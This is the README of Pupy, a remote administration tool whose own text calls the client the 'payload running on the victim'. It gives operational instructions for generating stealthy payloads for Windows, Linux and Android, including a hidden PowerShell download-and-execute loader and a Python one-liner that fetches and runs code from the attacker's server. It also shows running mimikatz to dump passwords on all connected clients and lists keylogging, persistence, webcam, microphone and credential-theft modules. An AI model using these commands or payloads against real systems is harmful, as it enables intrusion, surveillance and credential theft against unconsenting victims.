**********************************************************
Pupy
**********************************************************


Pupy is an opensource multiplatform Remote Administration Tool.
Pupy can be built to a classic executable, an apk, a pure python file (that can be loaded remotely from a python one-liner), a reflective DLL ... Some of these methods does not leave any trace on disk.
Pupy can load the python interpreter from memory and load any python module remotely from memory (.py, .pyc, .pyd).
You can then access objects on the client side from the serverside transparently with the awesome rpyc library.
Pupy can be used for various purposes :

    security research
    education
    pentesting
    administration
    projects and developments around privacy in python that require very low disk footprints
    ...


Installation
================





::

  git clone https://github.com/n1nj4sec/pupy.git pupy
 cd pupy
 git submodule init
 git submodule update
 pip install -r pupy/requirements.txt
 wget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz
 tar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates/ && rm payload_templates.txz && rm -r payload_templates



Features
==========

 - Multi-platform (tested on windows xp, 7, 8, 10, kali linux, ubuntu, osx, android)
 - On windows, the Pupy payload can be compiled as a reflective DLL and the whole python interpreter is loaded from memory. Pupy does not touch the disk :)
 - pupy can also be packed into a single .py file and run without any dependencies other that the python standard library on all OS
     - pycrypto gets replaced by pure python aes && rsa implementations when unavailable
 - Pupy can reflectively migrate into other processes
 - Pupy can remotely import, from memory, pure python packages (.py, .pyc) and compiled python C extensions (.pyd, .so). The imported python modules do not touch the disk.
 - Pupy is easily extensible, modules are quite simple to write, sorted by os and category.
 - A lot of awesome modules are already implemented!
 - Pupy uses [rpyc](https://github.com/tomerfiliba/rpyc) and a module can directly access python objects on the remote client
   - We can also access remote objects interactively from the pupy shell and you even get auto-completion of remote attributes!
 - Communication transports are modular, stackable and awesome. You could exfiltrate data using HTTP over HTTP over AES over XOR. Or any combination of the available transports !
 - Pupy can communicate using obfsproxy [pluggable transports](https://www.torproject.org/docs/pluggable-transports.html.en)
 - All the non interactive modules can be dispatched to multiple hosts in one command
 - Commands and scripts running on remote hosts are interruptible
 - Auto-completion for commands and arguments
 - Custom config can be defined: command aliases, modules automatically run at connection, ...
 - Interactive python shells with auto-completion on the all in memory remote python interpreter can be opened
 - Interactive shells (cmd.exe, /bin/bash, ...) can be opened remotely. Remote shells on Unix & windows clients have a real tty with all keyboard signals working fine just like a ssh shell
 - Pupy can execute PE exe remotely and from memory (cf. ex with mimikatz)
 - Pupy can generate payloads in various formats : apk,lin_x86,lin_x64,so_x86,so_x64,exe_x86,exe_x64,dll_x86,dll_x64,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky
 - Pupy can be deployed in memory, from a single command line using pupygen.py's python or powershell one-liners.
 - "scriptlets" can be embeded in generated payloads to perform some tasks "offline" without needing network connectivity (ex: start keylogger, add persistence, execute custom python script, check_vm ...)
 - tons of other features, check out the implemented modules

Implemented Transports
====================

 All transports in pupy are stackable. This mean that by creating a custom transport conf (pupy/network/transport/<transport_name>/conf.py), you can make you pupy session looks like anything. For example you could stack HTTP over HTTP over base64 over HTTP over AES over obfs3 :o)

 - rsa
 	- A layer with authentication & encryption using RSA and AES256, often stacked with other layers
 - aes
 	- layer using a static AES256 key
 - ssl (the default one)
 	- TCP transport wrapped with SSL
 - ssl_rsa
 	- same as ssl but stacked with a rsa layer
 - http
 	- layer making the traffic look like HTTP traffic. HTTP is stacked with a rsa layer
 - obfs3
 	- [A protocol to keep a third party from telling what protocol is in use based on message contents](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)
 	- obfs3 is stacked with a rsa layer for a better security
 - scramblesuit
 	- [A Polymorphic Network Protocol to Circumvent Censorship](http://www.cs.kau.se/philwint/scramblesuit/)
 	- scramblesuit is stacked with a rsa layer for a better security
 - udp
 	- rsa layer but over UDP (could be buggy, it doesn't handle packet loss yet)
 - other
 	- Other layers doesn't really have any interest and are given for code examples : (dummy, base64, XOR, ...)

Implemented Launchers (not up to date, cf. ./pupygen.py -h)
==========================================================

 Launchers allow pupy to run custom actions before starting the reverse connection
 - connect
 	- Just connect back
 - bind
 	- Bind payload instead of reverse
 - auto_proxy
 	- Retrieve a list of possible SOCKS/HTTP proxies and try each one of them. Proxy retrieval methods are: registry, WPAD requests, gnome settings, HTTP_PROXY env variable

Implemented Modules (not up to date)
=====================================

All platforms:
^^^^^^^^^^^^^^^^

 - command execution
 - download
 - upload
 - interactive python shell with auto-completion
 - interactive shell (cmd.exe, powershell.exe, /bin/sh, /bin/bash, ...)
 	- tty allocation is well supported on both windows and \*nix. Just looks like a ssh shell
 - shellcode exec
 - persistence
 - socks5 proxy
 - local and remote port forwarding
 - screenshot
 - keylogger
 - run the awesome credential gathering tool [LaZagne](https://github.com/AlessandroZ/LaZagne) from memory !
 - sniff tools, netcreds
 - process migration (windows & linux, not osx yet)
 - ...
 - a lot of other tools (upnp client, various recon/pivot tools using impacket remotely, ...)

Windows specific :
^^^^^^^^^^^^^^^^

 - migrate
   - inter process architecture injection also works (x86->x64 and x64->x86)
 - in memory execution of PE exe both x86 and x64!
 	- works very well with [mimitakz](https://github.com/gentilkiwi/mimikatz) :-)
 - webcam snapshot
 - microphone recorder
 - mouselogger:
 	- takes small screenshots around the mouse at each click and send them back to the server
 - token manipulation
 - getsystem
 - creddump
 - tons of useful powershell scripts
 - ...


Android specific
^^^^^^^^^^^^^^^^^^^^


 - Text to speech for Android to say stuff out loud
 - webcam snapshots (front cam & back cam)
 - GPS tracker !


Build payloads from sources
===========================

Windows EXE/Reflective DLL
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Cross-compile with WINE && VCPP

::

  cd client/sources
  ./buildenv.sh
  ./build.sh

you can also add the flag DEBUG=1 if you want the generated pupy exe to open a console and print debug tracebacks


Android APK
^^^^^^^^^^^^


pupy apk for Android is packaged with kivy and buildozer.


Step 1

follow the instructions from https://kivy.org/docs/guide/packaging-android.html to install buildozer and kivy
On Kali 2.0 I used:

::

  apt-get install python-kivy zlib1g-dev cython
  pip install buildozer

Step 2

::

  cd client/android_sources
  ./build.sh



Generate payloads
=====================

The "client" here refers to pupy's payload running on the victim, and the "server" here refers to the pupy's payload running on the attacker, independently of who initiate the connection (bind or reverse shell).

All available launchers, transports and scriptlets can be seen using the command :

::

  $ python pupygen.py -l


Launchers
^^^^^^^^^^^^

Pupy launchers is an abstraction layer to change the behavior of pupy clients before the connection starts. You can list available launchers with the command :

::

  $ python pupygen.py -h

The connect launcher doesn't do anything special before "client" connecting to the "server" using the configured transport. The bind launcher works like the connect launcher but the "server" needs to connect on the "client". The auto_proxy launcher will try to connect directly to the server, but if it fails, it will try to find the proxy configuration by various methods depending on the OS and attempt to connect using each potential proxy found.



Transport Types
^^^^^^^^^^^^^^

The transport define what protocol pupy will use to exfiltrate. Transports are usually customizable through the launcher options. The default transport used is ssl if none is supplied. Note that Pupy is compatible with obfsproxy's awesome transports like obfs3 or scramblesuit.


Generate Binaries
^^^^^^^^^^^^^^^^^^

payload.py (generated with ./pupygen.py -f py) can be run on windows, linux and osx directly. All dependencies and chosen scriptlets are embedded. However some functionalities won't work on windows like the process migration which needs the compiled binaries.



On Windows
""""""""""""

To generate binaries on windows you can use the precompiled binaries templates :

::

  $ usage: pupygen.py [-h]
                  [-f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}]
                  [-O {android,windows,linux}] [-A {x86,x64}] [-S] [-o OUTPUT]
                  [-D OUTPUT_DIR] [-s SCRIPTLET] [-l] [-E] [--no-use-proxy]
                  [--randomize-hash]
                  [--oneliner-listen-port ONELINER_LISTEN_PORT]
                  [--debug-scriptlets] [--debug] [--workdir WORKDIR]
                  [{bind,auto_proxy,dnscnc,connect}] ...

 ### Generate payloads for Windows, Linux, OSX and Android.

 positional arguments:
  {bind,auto_proxy,dnscnc,connect}
                        Choose a launcher. Launchers make payloads behave
                        differently at startup.
  launcher_args         launcher options

 optional arguments:
  -h, --help            show this help message and exit
  -f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}, --format {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}
                        (default: client)
  -O {android,windows,linux}, --os {android,windows,linux}
                        Target OS (default: windows)
  -A {x86,x64}, --arch {x86,x64}
                        Target arch (default: x86)
  -S, --shared          Create shared object
  -o OUTPUT, --output OUTPUT
                        output path
  -D OUTPUT_DIR, --output-dir OUTPUT_DIR
                        output folder
  -s SCRIPTLET, --scriptlet SCRIPTLET
                        offline python scriptlets to execute before starting
                        the connection. Multiple scriptlets can be privided.
  -l, --list            list available formats, transports, scriptlets and
                        options
  -E, --prefer-external
                        In case of autodetection prefer external IP
  --no-use-proxy        Don't use the target's proxy configuration even if it
                        is used by target (for ps1_oneliner only for now)
  --randomize-hash      add a random string in the exe to make it's hash
                        unknown
  --oneliner-listen-port ONELINER_LISTEN_PORT
                        Port used by oneliner listeners ps1,py (default: 8080)
  --debug-scriptlets    don't catch scriptlets exceptions on the client for
                        debug purposes
  --debug               build with the debug template (the payload open a
                        console)  --workdir WORKDIR     Set Workdir (Default = current workdir)


::

  $ ./pupygen.py connect --host 192.168.2.131:443
 binary generated with config :
 OUTPUT_PATH = /opt/pupy/pupy/pupyx86.exe
 LAUNCHER = 'connect'
 LAUNCHER_ARGS = ['--host', '192.168.2.131:443']
 SCRIPTLETS = []


Another option is to use the powershell oneliner format to deploy pupy from memory using powershell :

::

  $ ./pupygen.py -f ps1_oneliner connect --host 192.168.0.1:443 --transport http
 [+] copy/paste this one-line loader to deploy pupy without writing on the disk :
  ---
 powershell.exe -w hidden -c "iex(New-Object System.Net.WebClient).DownloadString('http://192.168.0.1:8080/p')"
  ---
 [+] Started http server on 0.0.0.0:8080
 [+] waiting for a connection ...


pupygen.py can embed offline scriptlets with the exe/dll you generate. These scripts will be executed before connecting back and can be used to add some offline capabilities like adding persistence through registry, checking for sandboxed environment, ... etc




On Android
"""""""""""

::

  $ ./pupygen.py -O android connect --host 192.168.2.131:443
 [+] packaging the apk ... (can take a 10-20 seconds)
 ...
 jar signed.

 binary generated with config :
 OUTPUT_PATH = /opt/pupy/pupy.apk
 LAUNCHER = 'connect'
 LAUNCHER_ARGS = ['--host', '192.168.2.131:443']
 SCRIPTLETS = []



On Linux & OSX
"""""""""""""

There is multiple options. The first one is generate a pure python payload and the victim needs to have installed python:

::

  $ ./pupygen.py -f py connect --transport ssl --host 192.168.1.1
 [+] generating payload ...
 embedding /usr/local/lib/python2.7/dist-packages/rpyc ...
 embedding /opt/pupy/pupy/network ...
 [+] payload successfully generated with config :
 OUTPUT_PATH = /opt/pupy/pupy/pupy_packed.py
 LAUNCHER = 'connect'
 LAUNCHER_ARGS = ['--transport', 'ssl', '--host', '192.168.1.1']
 SCRIPTLETS = []


Once the script executed on the linux/OSX host, you should have a pupy session. All non-standard dependencies are packaged inside the payload and loaded from memory.

 The same thing can be loaded remotely from a single line by using the py_oneliner format. This method has the advantage of not leaving any trace on the disk and can be deployed easily from a ssh shell using ssh tunnels

 ::

   $ ./pupygen.py -f py_oneliner connect --transport ssl --host 192.168.1.1

then execute follow the instructions. Your python one-liner should looks like :

::

  python -c 'import urllib;exec urllib.urlopen("http://X.X.X.X:8080/index").read()'


For linux another option is to generate an ELF with

::

  ./pupygen.py -f client -O linux -A x64 -o linux (or ./pupygen.py -f client -O linux -A x64 -o linux connect --host 192.168.xxx.xxx:443 -t ssl)


The third option is use pyinstaller to package a linux/OSX payload to create a standalone binary. This method has the advantage to work even if there is no recent/compatible python version installed on the host. You may need the following hidden imports in your .spec file :


* rpyc
* pycrypto
* rsa
* pyasn1
* uuid
* pty
* tty


Setting up the server
=======================


Using docker
^^^^^^^^^^^^

::

  mkdir /tmp/pupy
 docker run -d --name pupy -p 2022:22 -p 8080:8080 -v /tmp/pupy:/projects alxchk/pupy:unstable
 mkdir -p /tmp/pupy/keys
 cat ~/.ssh/id_rsa.pub >/tmp/pupy/keys/authorized_keys
 ssh -p 2022 pupy@127.0.0.1


The server
^^^^^^^^^^^^

To start the server, you can simply start pupysh.py on the correct port with the correct transport

::

  ./pupysh.py -h
 usage: pupysh [-h] [--log-lvl {DEBUG,INFO,WARNING,ERROR}] [--version]
                  [--transport {obfs3,tcp_ssl_proxy,tcp_cleartext,tcp_ssl,tcp_base64,scramblesuit,tcp_cleartext_proxy}]
                  [--port PORT]

 Pupy console

 optional arguments:
  -h, --help            show this help message and exit
  --log-lvl {DEBUG,INFO,WARNING,ERROR}, --lvl {DEBUG,INFO,WARNING,ERROR}
                        change log verbosity
  --version             print version and exit
  --transport {obfs3,tcp_ssl_proxy,tcp_cleartext,tcp_ssl,tcp_base64,scramblesuit,tcp_cleartext_proxy}
                        change the transport ! :-)
  --port PORT, -p PORT  change the listening port



The shell
=========


Find commands and modules help
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

First of all it is important to know that nearly all commands in pupy have a help builtin. So if at any moment you are wondering what a command does you can type your command followed by -h or --help

::

  sessions -h
 jobs -h
 run -h


This is even true for modules ! For example if you want to know how to use the pyexec module type :

::

  >> run pyexec -h
 usage: pyexec [-h] [--file <path>] [-c <code string>]

 execute python code on a remote system

 optional arguments:
 -h, --help            show this help message and exit
 --file <path>         execute code from .py file
 -c <code string>, --code <code string>
                      execute python oneliner code. ex : 'import
                      platform;print platform.uname()'


Use the completion !
^^^^^^^^^^^^^^^^^^^^^^

Nearly all commands and modules in pupy have custom auto-completion. So if you are wondering what you need to type just press TAB

::

  >> run
 getsystem           load_package        msgbox              ps                  shell_exec
 download            interactive_shell   memory_exec         persistence         pyexec              shellcode_exec
 exit                keylogger           migrate             port_scan           pyshell             socks5proxy
 get_info            linux_pers          mimikatz            portfwd             screenshot          upload
 getprivs            linux_stealth       mouselogger         process_kill        search              webcamsnap
 >> run load_package
 _sqlite3           linux_stealth      psutil             pupyimporter       pyshell            sqlite3
 interactive_shell  netcreds           ptyshell           pupymemexec        pywintypes27.dll   vidcap
 linux_pers         portscan           pupwinutils        pupyutils          scapy


::

  >> run pyexec -
 --code   --file   --help   -c       -h
 >> run pyexec --file /
 /bin/         /etc/         /lib/         /libx32/      /media/       /proc/        /sbin/        /sys/         /var/
 /boot/        /home/        /lib32/       /live-build/  /mnt/         /root/        /share/       /tmp/         /vmlinuz
 /dev/         /initrd.img   /lib64/       /lost+found/  /opt/         /run/         /srv/         /usr/



Escape your arguments
^^^^^^^^^^^^^^^^^^^^^^

Every command in pupy shell uses a unix-like escaping syntax. If you need a space in one of your arguments you need to put your argument between quotes.

::

  >> run shell_exec 'tasklist /V'

If you send a Windows path, you need to double the backquotes or put everything between quotes.

::

  >> run download 'C:\Windows\System32\cmd.exe'

Or

::

  >> run download C:\\Windows\\System32\\cmd.exe



Create Aliases
^^^^^^^^^^^^^^

Modules aliases can be defined in the pupy.conf file. If you define the following alias :

::

  shell=interactive_shell

running the command "shell" will be equivalent as running "run interactive_shell".

As an example, defining the following alias will add a command to kill the pupy client's process with signal 9:

::

  killme = pyexec -c 'import os;os.kill(os.getpid(),9)'



Jobs
^^^^

Jobs are commands running in the background. Some modules like socks5proxy or portfwd automatically start as jobs, but all modules can be run as jobs when used with the --bg argument.

::

  >> run --bg shell_exec 'tasklist /V'
 [%] job < shell_exec ['tasklist /V'] > started in background !


The --bg switch is typically used when you want to execute a long command/module and want the result later while having the shell still functioning.

The jobs output can be retrieved at any moment by using the jobs -p command. From the "jobs" command you can also list jobs status and kill jobs.


::

  >> jobs
 usage: jobs [-h] [-k <job_id>] [-l] [-p <job_id>]

 list or kill jobs

 optional arguments:
 -h, --help            show this help message and exit
 -k <job_id>, --kill <job_id>
 print the job current output before killing it
 -l, --list            list jobs
 -p <job_id>, --print-output <job_id>
						print a job output


Regular jobs can be set in Linux/Unix environments by running your pupysh.py script inside the Screen utility. You can then setup cronjobs to run the below command at whatever intervals you require, this essentially pastes the input after the word 'stuff' into the screen session. Replace 1674 with the ID of your screen session, the echo command is the Enter key being pressed.

::

  screen -S 1674 -X stuff 'this is an example command'$(echo -ne '\015')



Handle multiple clients connected
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

By default pupy launch every module you run on all connected clients. This allows for example to run mimikatz on all connected clients and dump passwords everywhere in one command

::

  run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit


To interact with one client, use the "sessions -i" command

::

  >> sessions -i 1
  ``` to interact with the session 1
  ```code
  sessions -i 'platform:Windows release:7'
  ``` to interact with all windows 7 only
  You can find all the available filtering parameters using the get_info module


Writing a module
====================


Writing a MsgBox module
^^^^^^^^^^^^^^^^^^^^^^

First of all write the function/class you want to import on the remote client
in the example we create the file pupy/packages/windows/all/pupwinutils/msgbox.py

::

  import ctypes
 import threading

 def MessageBox(text, title):
	t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
	t.daemon=True
	t.start()


then, simply create a module to load our package and call the function remotely

::

  from pupylib.PupyModule import *

 __class_name__="MsgBoxPopup"

 @config(cat="troll", tags=["message","popup"])
 class MsgBoxPopup(PupyModule):
	""" Pop up a custom message box """
	dependencies=["pupwinutils.msgbox"]

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
		self.arg_parser.add_argument('--title', help='msgbox title')
		self.arg_parser.add_argument('text', help='text to print in the msgbox :)')

	def run(self, args):
		self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
		self.log("message box popped !")



and that's it, we have a fully functional module :) This module is only compatible with windows, you can check the same module in the project to see how it's implemented to manage multi-os compatibility.

::

  >> run msgbox -h
 usage: msgbox [-h] [--title TITLE] text

 Pop up a custom message box

 positional arguments:
  text           text to print in the msgbox :)

  optional arguments:
    -h, --help     show this help message and exit
    --title TITLE  msgbox title
